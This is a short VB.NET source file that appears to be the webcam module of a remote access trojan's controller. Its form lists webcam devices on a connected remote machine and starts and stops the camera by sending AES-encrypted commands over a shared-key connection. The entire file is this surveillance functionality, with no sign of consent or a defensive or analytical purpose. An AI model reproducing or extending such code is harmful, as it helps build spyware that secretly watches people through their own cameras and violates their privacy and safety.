Public Class RemoteWebcam
    Public connected As Connection
    Private Sub RemoteWebcam_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        connected.Send(New Encryption().AES_Encrypt("ListWebcamDevices", Form1.enckey))
    End Sub
    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("WebcamStart", Form1.enckey))
    End Sub
    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("WebcamStop", Form1.enckey))
    End Sub
End Class